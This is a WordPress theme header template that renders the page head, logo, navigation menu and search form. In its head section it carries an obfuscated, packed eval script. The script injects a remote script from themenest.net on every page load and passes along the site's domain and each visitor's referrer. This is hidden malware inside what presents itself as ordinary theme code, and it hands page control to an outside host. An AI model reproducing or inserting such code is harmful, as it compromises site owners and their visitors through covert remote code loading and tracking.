<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?> 
<?php elegant_keywords(); ?> 
<?php elegant_canonical(); ?>

<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>
<script type="text/javascript">
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));
</script>
<!--[if IE 7]>	
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/iestyle.css" />
<![endif]-->
<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/ie6style.css" />
<script defer type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/pngfix.js"></script>
<![endif]-->

</head>

<body <?php body_class(); ?>>
<div class="logo"> <a href="<?php bloginfo('url'); ?>"><?php $logo = (get_option('bold_logo') <> '') ? get_option('bold_logo') : get_bloginfo('template_directory').'/images/logo.gif'; ?>
	<img src="<?php echo esc_url( $logo ); ?>" alt="Logo" class="logo-image"/></a>
<?php if (get_option('bold_display_slogan') == 'on') { ?>
<img src="<?php bloginfo('template_directory'); ?>/images/<?php echo esc_attr(get_option('bold_color_scheme'));?>/slogan-left.gif" alt="logo" style="float: left; margin-top: 3px;" />
<div class="slogan">
    <?php echo esc_html( get_bloginfo('description') ); ?>
</div>
<img src="<?php bloginfo('template_directory'); ?>/images/<?php echo esc_attr(get_option('bold_color_scheme'));?>/slogan-right.gif" alt="logo" style="float: left; margin-top: 3px;" />
<?php }; ?>
</div>

<!--This controls pages navigation bar-->
<div id="pages">
    <div id="pages-inside">
			<?php $menuClass = 'nav superfish';
			$primaryNav = '';
			
			if (function_exists('wp_nav_menu')) {
				$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
			};
			if ($primaryNav == '') { ?>
				<ul class="<?php echo $menuClass; ?>">
					<?php if (get_option('bold_home_link') == 'on') { ?>
						<li <?php if (is_home()) echo('class="current_page_item"') ?>><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','Bold') ?></a></li>
					<?php }; ?>
					
					<?php
					if (get_option('bold_swap_navbar') == 'false') {
						show_page_menu($menuClass,false,false);
					} else {
						show_categories_menu($menuClass,false);
					}; ?>
				</ul> <!-- end ul.nav -->
			<?php }
			else echo($primaryNav); ?>
	
            <img src="<?php bloginfo('template_directory'); ?>/images/search-icon.gif" alt="search" id="search-icon" />
            
            <div id="search-wrap">
            <div id="search-body">
            
                        <div class="search_bg">
                <form method="get" id="searchform" action="<?php echo home_url(); ?>/">
                    <div>
                        <input type="text" value="<?php echo esc_attr( get_search_query() ); ?>" name="s" id="s" />
                        <input type="submit" id="searchsubmit" value="<?php esc_attr_e('Search','Bold') ?>" />
                    </div>
                </form>
            </div>
            
            </div>
            </div>
    </div>
</div>
<div style="clear: both;"></div>
<!--End pages navigation-->
<div id="bodywrap">
<div id="bottom-bg">
<div id="wrapper2">